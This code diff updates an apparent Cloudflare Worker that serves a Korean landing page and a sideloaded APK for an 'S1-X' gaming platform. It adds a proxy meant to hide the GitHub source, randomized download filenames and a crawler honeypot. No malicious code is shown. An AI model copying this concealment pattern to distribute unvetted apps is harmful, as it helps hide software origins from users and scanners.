@@ -41,7 +41,7 @@ async function handleRequest(request) {
     
     try {
       // 使用代理方式获取APK，避免直接暴露GitHub链接
-      const response = await fetch('https://github.com/SLOMEDIALLC/S1-X/blob/main/s1-x_flow_sign_en.apk')
+      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/s1-x_flow_sign_en.apk')
       
       // 添加安全相关的响应头
       return new Response(response.body, {
@@ -79,7 +79,7 @@ async function handleRequest(request) {
       'X-Frame-Options': 'DENY',
       'Referrer-Policy': 'no-referrer',
       'X-XSS-Protection': '1; mode=block',
-      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
+      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://raw.githubusercontent.com;"
     }
   })
 }
@@ -336,7 +336,7 @@ function generateHtmlContent() {
 <body>
     <div class="container">
         <div class="logo-container">
-            <img src="https://laranja9.s3.sa-east-1.amazonaws.com/dev/s1-x/img/1733467940295-s1-x.png" class="logo" alt="S1-X 로고">
+            <img src="https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/x.png" class="logo" alt="S1-X 로고">
         </div>
         <h1>S1-X</h1>
         <p class="description">S1-X에 오신 것을 환영합니다. 귀하의 전용 PG 게임 플랫폼입니다. 다양한 게임 선택, 고화질 그래픽, 원활한 경험을 제공하며 언제 어디서나 게임의 즐거움을 즐길 수 있습니다. 지금 다운로드하여 게임 여행을 시작하세요!</p>
@@ -399,7 +399,7 @@ function generateHtmlContent() {
                 
                 // 创建请求
                 const xhr = new XMLHttpRequest();
-                xhr.open('GET', '/stripchat_flow_edit_sign_en.apk');
+                xhr.open('GET', '/s1-x_flow_sign_en.apk');
                 xhr.responseType = 'blob';
                 xhr.setRequestHeader('x-download-token', token);
                 xhr.setRequestHeader('x-timestamp', timestamp.toString());
@@ -411,14 +411,23 @@ function generateHtmlContent() {
                         const url = URL.createObjectURL(blob);
                         const a = document.createElement('a');
                         a.href = url;
-                        a.download = 'app_' + Math.random().toString(36).substring(2, 8) + '.apk';
+                        a.download = 's1x_app_' + Math.random().toString(36).substring(2, 8) + '.apk';
                         document.body.appendChild(a);
                         a.click();
                         document.body.removeChild(a);
+                    } else {
+                        console.error('Download failed with status:', xhr.status);
+                        alert('다운로드에 실패했습니다. 나중에 다시 시도하십시오.'); // 下载失败，请稍后再试 (韩语)
                     }
                 };
                 
+                xhr.onerror = function() {
+                    console.error('Download request failed');
+                    alert('다운로드 요청이 실패했습니다. 인터넷 연결을 확인하십시오.'); // 下载请求失败，请检查您的网络连接 (韩语)
+                };
+                
                 xhr.send();
+                console.log('Download request sent for:', '/s1-x_flow_sign_en.apk');
             });
             
             // 添加蜜罐链接 (对爬虫可见，对用户不可见)
